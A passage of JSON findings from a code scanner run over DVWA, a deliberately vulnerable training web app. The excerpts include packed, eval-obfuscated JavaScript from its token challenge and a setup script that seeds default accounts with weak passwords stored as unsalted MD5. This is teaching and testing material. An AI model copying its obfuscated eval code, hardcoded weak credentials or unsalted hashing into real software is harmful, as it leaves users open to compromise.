7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 8409,
        "endLocationLine": 1,
        "endLocationColumn": 8413
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "// Get the base directory for the avatar media...\n$baseUrl = &#39;http://&#39;.$_SERVER[ &#39;SERVER_NAME&#39; ].$_SERVER[ &#39;PHP_SELF&#39; ];\n$stripPos = strpos( $baseUrl, &#39;dvwa/setup.php&#39; );\n$baseUrl = substr( $baseUrl, 0, $stripPos ).&#39;dvwa/hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}admin.jpg&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n",
        "startLocationLine": 58,
        "startLocationColumn": 51,
        "endLocationLine": 58,
        "endLocationColumn": 55
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "Hack",
        "excerpt": "$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}admin.jpg&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$baseUrl}pablo.jpg&#39;),\n\t(&#39;5&#39;,&#39;bob&#39;,&#39;smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}smithy.jpg&#39;);&quot;;\nif( !pg_query( $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . pg_last_error() );\n\tdvwaPageReload();\n",
        "startLocationLine": 63,
        "startLocationColumn": 8,
        "endLocationLine": 63,
        "endLocationColumn": 12
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "*/\n\n// Connect to server\nif( !@pg_connect(&quot;host={$_DVWA[ &#39;db_server&#39; ]} port={$_DVWA[ &#39;db_port&#39; ]} user={$_DVWA[ &#39;db_user&#39; ]} password={$_DVWA[ &#39;db_password&#39; ]}&quot;) ) {\n\tdvwaMessagePush( &quot;Could not connect to the database.&lt;br/&gt;Please check the config file.&quot; );\n\tdvwaPageReload();\n}\n\n// Create database\n",
        "startLocationLine": 10,
        "startLocationColumn": 102,
        "endLocationLine": 10,
        "endLocationColumn": 110
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\n\n// Connect to server AND connect to the database\n$dbconn = @pg_connect(&quot;host={$_DVWA[ &#39;db_server&#39; ]} port={$_DVWA[ &#39;db_port&#39; ]} dbname={$_DVWA[ &#39;db_database&#39; ]} user={$_DVWA[ &#39;db_user&#39; ]} password={$_DVWA[ &#39;db_password&#39; ]}&quot;);\n\n\n// Create table &#39;users&#39;\n\n$drop_table = &quot;DROP TABLE IF EXISTS users;&quot;;\n",
        "startLocationLine": 34,
        "startLocationColumn": 140,
        "endLocationLine": 34,
        "endLocationColumn": 148
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "username",
        "excerpt": "\tdvwaPageReload();\n}\n\n$create_tb = &quot;CREATE TABLE users (user_id integer UNIQUE, first_name text, last_name text, username text, password text, avatar text, PRIMARY KEY (user_id));&quot;;\n\nif( !pg_query( $create_tb ) ) {\n\tdvwaMessagePush( &quot;Table could not be created&lt;br /&gt;SQL: &quot; . pg_last_error() );\n\tdvwaPageReload();\n}\n",
        "startLocationLine": 46,
        "startLocationColumn": 92,
        "endLocationLine": 46,
        "endLocationColumn": 100
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\tdvwaPageReload();\n}\n\n$create_tb = &quot;CREATE TABLE users (user_id integer UNIQUE, first_name text, last_name text, username text, password text, avatar text, PRIMARY KEY (user_id));&quot;;\n\nif( !pg_query( $create_tb ) ) {\n\tdvwaMessagePush( &quot;Table could not be created&lt;br /&gt;SQL: &quot; . pg_last_error() );\n\tdvwaPageReload();\n}\n",
        "startLocationLine": 46,
        "startLocationColumn": 107,
        "endLocationLine": 46,
        "endLocationColumn": 115
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "$baseUrl = substr( $baseUrl, 0, $stripPos ).&#39;dvwa/hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}admin.jpg&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$baseUrl}pablo.jpg&#39;),\n\t(&#39;5&#39;,&#39;bob&#39;,&#39;smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}smithy.jpg&#39;);&quot;;\nif( !pg_query( $insert ) ) {\n",
        "startLocationLine": 61,
        "startLocationColumn": 36,
        "endLocationLine": 61,
        "endLocationColumn": 44
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$baseUrl}pablo.jpg&#39;),\n\t(&#39;5&#39;,&#39;bob&#39;,&#39;smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}smithy.jpg&#39;);&quot;;\nif( !pg_query( $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . pg_last_error() );\n\tdvwaPageReload();\n}\n\n",
        "startLocationLine": 65,
        "startLocationColumn": 35,
        "endLocationLine": 65,
        "endLocationColumn": 43
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\tdvwaPageReload();\n}\n\n$create_tb = &quot;CREATE TABLE users (user_id integer UNIQUE, first_name text, last_name text, username text, password text, avatar text, PRIMARY KEY (user_id));&quot;;\n\nif( !pg_query( $create_tb ) ) {\n\tdvwaMessagePush( &quot;Table could not be created&lt;br /&gt;SQL: &quot; . pg_last_error() );\n\tdvwaPageReload();\n}\n",
        "startLocationLine": 46,
        "startLocationColumn": 122,
        "endLocationLine": 46,
        "endLocationColumn": 128
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
